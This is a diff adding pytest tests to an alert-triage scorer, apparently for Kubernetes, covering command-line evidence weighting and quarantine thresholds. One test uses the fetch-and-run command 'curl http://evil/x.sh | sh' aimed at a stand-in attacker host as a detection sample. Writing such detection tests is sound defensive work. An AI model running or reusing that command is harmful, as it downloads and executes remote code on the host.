@@ -128,6 +128,36 @@ class TestScore:
         assert result.action == Action.QUARANTINE
         assert "active-compromise rule" in result.reason
 
+    def test_download_and_execute_cmdline_adds_weight(self):
+        from triage import AlertEvidence
+
+        base = score(_ctx(runs_as_root=True))
+        ev = AlertEvidence(proc_cmdline="curl http://evil/x.sh | sh")
+        boosted = score(_ctx(runs_as_root=True), evidence=ev)
+        assert boosted.score == base.score + 20
+
+    def test_benign_cmdline_no_weight(self):
+        from triage import AlertEvidence
+
+        base = score(_ctx(runs_as_root=True))
+        ev = AlertEvidence(proc_cmdline="ls -la /tmp")
+        same = score(_ctx(runs_as_root=True), evidence=ev)
+        assert same.score == base.score
+
+    def test_score_40_is_quarantine_floor(self):
+        # LoadBalancer alone = 40 -> quarantine. Locks the real threshold
+        # (docs historically claimed quarantine started at 70).
+        result = score(_ctx(service_type="LoadBalancer"))
+        assert result.score == 40
+        assert result.action == Action.QUARANTINE
+        assert result.severity == "high"
+
+    def test_score_below_40_annotates(self):
+        # NodePort(15) + dangerous caps(20) = 35 -> below the quarantine floor.
+        result = score(_ctx(service_type="NodePort", has_dangerous_caps=True))
+        assert result.score == 35
+        assert result.action == Action.ANNOTATE
+
 
 # ---------------------------------------------------------------------------
 # enrich() — integration-style tests with mocked k8s clients
